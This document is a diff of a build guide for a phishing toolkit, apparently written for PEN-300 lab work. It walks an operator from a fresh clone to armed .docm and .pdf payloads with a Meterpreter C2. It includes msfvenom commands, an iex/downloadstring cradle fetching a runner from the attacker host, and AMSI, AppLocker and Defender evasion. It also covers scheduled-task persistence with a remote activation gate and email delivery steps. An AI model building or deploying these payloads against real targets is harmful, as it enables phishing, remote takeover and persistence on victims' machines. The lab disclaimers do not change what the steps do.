@@ -1,75 +1,67 @@
 # BUILD.md — End-to-End: Clone to Armed Payload
 
-Walks the full pipeline: from a fresh clone of this repo to two fully usable
-phishing payloads (`.docm` in an encrypted zip, `.pdf`) with a working C2,
-tested against a lab target, and ready for delivery.
+From fresh clone to two fully usable phishing payloads (`.docm` in an
+encrypted zip, `.pdf`) with a working C2, tested against a lab target, and
+ready for delivery.
 
-Component-level build notes live in each subdirectory's README. This file
-is the operator's walkthrough that ties them together.
+Component-level notes live in each subdirectory. This file is the operator's
+walkthrough.
 
 ---
 
 ## Hardened lab note
 
 If your target is a PEN-300 challenge lab or any system with AppLocker,
-LSA protection, or EDR enabled, read [`HARDENED.md`](HARDENED.md) first.
-It lists what the default files catch and what needs to change per vector.
+LSA protection, or EDR, read [`HARDENED.md`](HARDENED.md) first. It has the
+decision tree for which vector path to use and the pre-deployment checklist.
 
-The VBA, poller, and `run.txt` runner in this repo are already written for
-hardened labs — emulator detection, non-emulated API checks, split AMSI
-strings, and `-EncodedCommand` for the scheduled task. The remaining
-question on any specific lab is AppLocker's treatment of the PDF launcher
-(see `HARDENED.md` for three escape routes).
+The kit is written for hardened labs. The DOC vector auto-detects whether
+PowerShell is AppLocker-blocked and switches to the InstallUtil path
+automatically. No manual branching at delivery.
 
 ---
 
 ## Prerequisites
 
-### On the Kali C2 box
+### Kali C2
 
 ```bash
 sudo apt install -y apache2 mono-devel p7zip-full pandoc python3
 sudo systemctl start apache2
 ```
 
-Metasploit is assumed installed (Kali default).
+Metasploit assumed installed (Kali default).
 
-### On a Windows dev box
+### Windows dev box
 
-- Windows 10/11 with Microsoft Word (2016 or later)
+- Windows 10/11 with Microsoft Word (2016+)
 - .NET Framework 4.x (ships with Windows) — provides `csc.exe`
-- Git Bash or WSL if you want to run the bash helpers
-- A Windows lab VM for testing — **do not test on a production system**
+- Git Bash or WSL for bash helpers
+- Lab VM for testing — **do not test on production**
 
 ### Network
 
-Kali must be reachable from the lab VM on TCP 80 (web root) and TCP 443
-(Meterpreter handler). In the course lab this is the VPN; on a home lab this
-is a bridged adapter.
+Kali reachable from the lab VM on TCP 80 (web root) and TCP 443 (handler).
 
 ---
 
-## Step 1 — Set up the C2 web root and handler
+## Step 1 — C2 setup
 
-### 1a. Web root layout
+### 1a. Web root
 
 ```bash
 sudo mkdir -p /var/www/html
 sudo chown -R www-data:www-data /var/www/html
 sudo chmod 755 /var/www/html
 
-# Placeholder decoy page (optional)
 cat > /var/www/html/decoy.html <<'HTML'
 <!doctype html><html><head><title>IT Portal</title></head>
 <body><h1>Document Portal</h1>
 <p>Please contact IT support for access.</p></body></html>
 HTML
-
-# Activate gate — start absent. Touch this to fire the on-demand callback.
-# Do NOT create it yet.
 ```
 
-### 1b. Start the Metasploit handler
+### 1b. Handler
 
 ```bash
 mkdir -p ~/self_cert && cd ~/self_cert
@@ -78,34 +70,24 @@ openssl req -new -x509 -nodes -out cert.crt -keyout priv.key \
 cat priv.key cert.crt > nasa.pem
 cd -
 
-# Edit handler.rc to point at ~/self_cert/nasa.pem and your LHOST
-$EDITOR shared/handler.rc
-
-# Launch
+$EDITOR shared/handler.rc    # set LHOST, verify HandlerSSLCert path
 msfconsole -q -r shared/handler.rc
 ```
 
-Verify: `msf6 > jobs` should show the handler running on 443.
+Verify: `msf6 > jobs` shows the handler on 443.
 
 ---
 
 ## Step 2 — Generate `run.txt`
 
-`run.txt` is the ciphered reflective PowerShell shellcode runner that both
-vectors download. Template in `shared/run_txt_example.ps1`.
-
-### 2a. Generate raw shellcode
+Template in `shared/run_txt_example.ps1`.
 
 ```bash
 cd /tmp
 msfvenom -p windows/x64/meterpreter/reverse_https \
     LHOST=<KALI_IP> LPORT=443 \
     EXITFUNC=thread -f ps1 -o raw.txt
-```
 
-### 2b. Cipher the shellcode (Caesar +5)
-
-```bash
 python3 - <<'PY'
 import re
 data = open('raw.txt').read()
@@ -116,197 +98,158 @@ with open('ciphered.txt','w') as f:
 PY
 ```
 
-### 2c. Assemble run.txt
-
-Copy `shared/run_txt_example.ps1` to `run.txt`, then replace the line:
-
-```powershell
-[Byte[]] $buf = <CIPHERED_SHELLCODE_BYTES_HERE>
-```
-
-with the contents of `ciphered.txt`.
-
-### 2d. Deploy
+Copy `shared/run_txt_example.ps1` to `run.txt`, replace
+`<CIPHERED_SHELLCODE_BYTES_HERE>` with `ciphered.txt` contents.
 
 ```bash
 sudo cp run.txt /var/www/html/run.txt
 sudo chmod 644 /var/www/html/run.txt
 ```
 
-**Verify from a lab browser:**
-`http://<KALI_IP>/run.txt` should return the script as plaintext.
+Verify: `http://<KALI_IP>/run.txt` returns the script.
 
 ---
 
-## Step 3 — Build the DOC vector
+## Step 3 — Prepare the DOC vector
 
-### 3a. Generate the docx body
+### 3a. Encode the two PowerShell blobs
+
+```bash
+python3 tools/encode_poller.py shared/activate_poller.ps1
+python3 tools/encode_poller.py shared/run_txt_launcher.ps1
+# copy both single-line outputs
+```
+
+### 3b. Build the InstallUtil DLL
+
+```bash
+bash tools/build_dll.sh
+# produces shared/Update.dll
+```
+
+Edit `shared/bypass_dll.cs` — replace `PASTE_BASE64_BLOB_HERE` in the `B64`
+constant with the output of:
+```bash
+python3 tools/encode_poller.py shared/run_txt_launcher.ps1
+```
+Then re-run `bash tools/build_dll.sh`.
+
+### 3c. Generate the docx body
 
 ```bash
 cd doc
 pandoc q4_invoice_body.md -o Q4_Invoice.docx
 ```
 
-### 3b. Encode the poller for embedding
-
-```bash
-python3 tools/encode_poller.py shared/activate_poller.ps1
-# Copy the single-line base64 output.
-```
-
-### 3c. Embed the macro in Word (manual)
+### 3d. Embed the macro
 
 1. Open `Q4_Invoice.docx` in Word.
 2. `Alt+F11` → Insert → Module.
-3. Paste the entire contents of `doc/q4_invoice.vba`.
-4. **Edit these placeholders in the VBA before saving:**
-   - `Const POLLER_B64 As String = "PASTE_BASE64_BLOB_HERE"` — paste the
-     base64 output from step 3b between the quotes.
-   - In `MyMacro` and `PersistRunKey` and `PersistStartupLink`, change
-     `http://192.168.119.120/run.txt` to your Kali IP.
-5. File → Save As → **Word Macro-Enabled Document (\*.docm)** →
-   `Q4_Invoice.docm`.
-6. Close, reopen. Confirm the yellow **SECURITY WARNING — Macros have been
-   disabled** banner appears. Click **Enable Content**. Verify no error.
+3. Paste `doc/q4_invoice.vba` in full.
+4. Replace:
+   - `POLLER_B64` with the poller blob from 3a
+   - `LAUNCHER_B64` with the launcher blob from 3a
+   - Three occurrences of `http://192.168.119.120/run.txt` with your Kali IP
+5. Save As → Word Macro-Enabled Document → `Q4_Invoice.docm`.
+6. Close, reopen. Confirm the macro-warning banner and no error on Enable.
 
-### 3d. Package for delivery
+### 3e. Package
 
 ```bash
 7z a -p"invoice2024" -mhe=on -tzip Q4_Invoice.zip Q4_Invoice.docm
 ```
 
-`Q4_Invoice.zip` is your DOC vector, ready to attach.
-
 ---
 
-## Step 4 — Build the PDF vector
+## Step 4 — Prepare the PDF vector
 
-### 4a. Encode the cradle and populate payload.cs
+### 4a. Encode the cradle
 
 ```bash
-python3 - <<'PY'
-import base64
-cmd = "iex((new-object system.net.webclient).downloadstring('http://192.168.119.120/run.txt'))"
-b64 = base64.b64encode(cmd.encode('utf-16-le')).decode()
-ciphered = [b ^ 0x5A for b in b64.encode('utf-8')]
-print("static byte[] ciphered = new byte[] {")
-print(",".join(f"0x{b:02x}" for b in ciphered))
-print("};")
-PY
+python3 tools/encode_cradle.py --kali <KALI_IP>
+# copy the output into pdf/payload.cs
 ```
 
-Paste the output over the placeholder in `pdf/payload.cs`.
-
-### 4b. Compile the launcher
+### 4b. Compile
 
 ```bash
 cd pdf
-
-# On Windows:
 csc /target:exe /platform:x64 /out:payload.exe payload.cs
-
-# Or on Linux/WSL:
-mcs -platform:x64 -out:payload.exe payload.cs
+# or: mcs -platform:x64 -out:payload.exe payload.cs
 ```
 
 ### 4c. Generate the PDF
 
+Standard:
 ```bash
-python3 build_pdf_payload.py \
-    --exe payload.exe \
-    --out Q4_Invoice.pdf \
-    --name "Q4_Invoice_Update.exe"
+python3 build_pdf_payload.py --exe payload.exe --out Q4_Invoice.pdf
 ```
 
-`Q4_Invoice.pdf` is your PDF vector, ready to attach.
+AppLocker-hardened target:
+```bash
+python3 build_pdf_payload.py --exe payload.exe --out Q4_Invoice.pdf \
+    --cpath "C:\\ProgramData\\Microsoft\\"
+```
 
 ---
 
-## Step 5 — Test on the lab VM
+## Step 5 — Test on lab VM
 
-**Do this before any real delivery.** Both vectors.
+**Both vectors, before delivery.**
 
-### 5a. Test the DOC vector
+### 5a. DOC vector
 
-1. Copy `Q4_Invoice.zip` to the lab VM.
-2. Extract with 7-Zip using password `invoice2024`.
-3. Verify the extracted `.docm` **does not** carry MoTW (right-click →
-   Properties → Security should be blank).
-4. Open the `.docm` in Word → click **Enable Content**.
-5. Watch the handler — a Meterpreter session should open within ~10 seconds.
+1. Copy `Q4_Invoice.zip` to lab VM, extract with 7-Zip (`invoice2024`).
+2. Confirm the extracted `.docm` has no MoTW (Properties → Security empty).
+3. Open in Word → click **Enable Content**.
+4. Handler should catch a session within ~30 seconds.
 
 If no session:
-- Check the web log: `sudo tail -f /var/log/apache2/access.log` — did the
-  VM request `run.txt`?
-- Check for a Defender alert on the VM
-- Confirm WMI is reachable (`Get-Service Winmgmt`)
+- `sudo tail -f /var/log/apache2/access.log` — did the VM hit `/run.txt`?
+- Check Defender history
+- If the lab is AppLocker-hardened, confirm `Update.dll` was staged at
+  `%PROGRAMDATA%\Microsoft\Update.dll` before the .docm was opened
 
-### 5b. Test the PDF vector
+### 5b. PDF vector
 
-1. Copy `Q4_Invoice.pdf` to the lab VM.
-2. Open in **Adobe Reader**.
-3. Confirm the "Loading invoice viewer..." alert appears.
-4. Confirm the "Open attachment?" prompt appears with the correct filename.
+1. Copy `Q4_Invoice.pdf` to lab VM.
+2. Open in **Adobe Reader** (not Edge/Chrome).
+3. Confirm "Loading invoice viewer..." alert.
+4. Confirm "Open attachment?" prompt.
 5. Click **Open**. Handler should catch a session.
 
-If no session:
-- Confirm Reader's JavaScript is enabled (Edit → Preferences → JavaScript)
-- Check Defender's Protection History for `payload.exe`
+### 5c. Persistence and callback
 
-### 5c. Test persistence
+1. Reboot, log in.
+2. Wait 5–10 min (poller runs every 5 min but does nothing without
+   `/activate`).
+3. From Kali: `sudo touch /var/www/html/activate`.
+4. Session should open within 5 minutes.
+5. `sudo rm /var/www/html/activate` — no further sessions.
 
-After a successful shell from either vector:
+### 5d. Confirm the gate
 
-1. Reboot the VM.
-2. Log back in as the same user.
-3. Wait 5–10 minutes (the poller runs every 5 minutes).
-4. From Kali: `sudo touch /var/www/html/activate`
-5. Within 5 minutes, a new session should open without any user action.
-
-Then:
-
-```bash
-sudo rm /var/www/html/activate
-```
-
-### 5d. Test the callback gate
-
-While the target is running the poller, verify that **no session fires**
-when `/activate` is absent. Watch the handler for 10 minutes. You should
-see nothing.
+With no `/activate` present, watch the handler for 10 minutes. Nothing
+should fire.
 
 ---
 
-## Step 6 — Package and deliver
-
-| File | Vector | Delivery |
-|------|--------|----------|
-| `Q4_Invoice.zip` | DOC | Attach to email — password in body |
-| `Q4_Invoice.pdf` | PDF | Attach directly, or zip if gateway strips PDFs |
-
-Sample email body in `doc/q4_invoice_body.md`. Adapt to the engagement's
-cover story.
-
----
-
-## Step 7 — Operator workflow during engagement
+## Step 6 — Operator workflow
 
 ```bash
-# 1. Handler running (from Step 1b)
-# 2. Deliver either vector via phishing
-# 3. When user clicks, session opens:
+# Handler running (Step 1b)
+# Delivery via either vector
+# When session opens:
 sessions -l
 sessions -i <n>
 background
 
-# 4. Target under our control. Persistence installed.
-# 5. To re-establish later (after logoff, lock, reboot):
+# Re-establish later:
 sudo touch /var/www/html/activate
-# wait up to 5 minutes
-# when session opens:
+# wait, catch session
 sudo rm /var/www/html/activate
 
-# 6. Before engagement close:
+# Before close:
 sessions -i <n>
 shell
 powershell -exec bypass -File shared/cleanup.ps1
@@ -317,42 +260,46 @@ exit
 
 ## Troubleshooting
 
-| Symptom | Likely cause | Fix |
-|---------|--------------|-----|
-| Word blocks macro, no "Enable Content" | Office 2021/365 macro policy | Use PDF vector |
-| `.docm` opens in Protected View | MoTW propagated through zip | Re-zip with `7z -mhe=on` |
-| PDF opens in browser, no JS | Chrome/Edge/Firefox built-in viewer | Set Adobe Reader as default |
-| No session after Enable Content | Cradle failed (WMI, network, DNS) | Check Apache log — did VM hit `/run.txt`? |
-| No session from PDF | Defender caught `payload.exe` | Check history; add injection layer (Mod 24.3.1) |
-| Handler catches, then dies | Stage encoding or EXITFUNC | Confirm `EXITFUNC=thread` and `EnableStageEncoding true` |
-| `/activate` fires but no session | AMSI bypass failed or Defender caught runner | Disable AMSI manually to test; swap bypass method |
-| `csc` not found on Windows | PATH missing .NET dir | Add `C:\Windows\Microsoft.NET\Framework64\v4.0.30319` to PATH |
-| Scheduled task never fires | `schtasks /tr` length exceeded | Already avoided — the VBA uses `Register-ScheduledTask` |
+| Symptom | Cause | Fix |
+|---------|-------|-----|
+| Word blocks macro, no Enable | Office 2021/365 policy | Use PDF vector |
+| `.docm` in Protected View | MoTW through zip | Re-zip with `7z -mhe=on` |
+| PDF opens in browser, no JS | Chrome/Edge/Firefox viewer | Set Adobe Reader default |
+| No session after Enable Content | Cradle failed | Check Apache log for `/run.txt` hit |
+| No session from PDF | Defender caught `payload.exe` | Check history; use `--cpath` or InstallUtil DOC path |
+| Handler catches then dies | Stage encoding or EXITFUNC | Confirm `EXITFUNC=thread` and `EnableStageEncoding true` |
+| `/activate` fires no session | AMSI bypass failed | Test manually with AMSI disabled; swap bypass |
+| `csc` not found | PATH missing | Add `C:\Windows\Microsoft.NET\Framework64\v4.0.30319` to PATH |
+| InstallUtil path never taken | PowerShell actually works on target | Expected — Path A is preferred. Path B is fallback only |
+| InstallUtil completes no session | DLL not staged or B64 mismatch | Confirm `Update.dll` at `%PROGRAMDATA%\Microsoft\` and B64 regenerated |
 
 ---
 
 ## What NOT to do
 
-- Do not test against any system you do not own or do not have written
-  authorization to test.
-- Do not push compiled artifacts to a public repo. `.gitignore` blocks them.
-- Do not reuse the certificate, cradle base64, or cipher key across
-  engagements.
-- Do not leave `/activate` present on the C2 after an engagement. Remove it.
+- Do not test against systems you do not own or have written authorization
+  for. Every command here is one step from a crime in most jurisdictions.
+- Do not commit compiled artifacts. `.gitignore` blocks them.
+- Do not reuse certificates, cradles, or cipher keys across engagements.
+- Do not leave `/activate` on the C2 after an engagement.
 
 ---
 
 ## Course cross-reference
 
-| Step | PEN-300 Module |
-|------|----------------|
-| AMSI bypass in poller / runner | Mod 12.3.1 |
-| DOC vector macro | Mod 4.1.2 |
-| De-chaining via WMI | Mod 11.8.2 |
-| Emulator detection | Mod 11.6.1 |
-| Non-emulated API check | Mod 11.6.2 |
-| Ciphered shellcode | Mod 11.5.2 |
-| Reflective shellcode runner | Mod 8.2.3 |
-| PDF embedding + OpenAction | Mod 4-adjacent |
-| Certificate signing | Mod 14.3.1 |
-| Stage encoding | Mod 11.4.1 |
+| Technique | Module |
+|-----------|--------|
+| AMSI bypass (context corruption) | 12.3.1 |
+| AMSI bypass (amsiInitFailed) | 12.3.2 |
+| Office macro phishing | 4.1.2 |
+| De-chaining via WMI | 11.8.2 |
+| Emulator detection | 11.6.1 |
+| Non-emulated API check | 11.6.2 |
+| Ciphered shellcode | 11.5.2 |
+| Reflective shellcode runner | 8.2.3 |
+| InstallUtil AppLocker bypass | 13.3.3 |
+| DLL sideloading (fallback) | 6.1 |
+| Certificate signing | 14.3.1 |
+| Stage encoding | 11.4.1 |
+| Domain fronting (egress) | 14.6 |
+| LSASS dump with mimidrv | 17.3.2 |
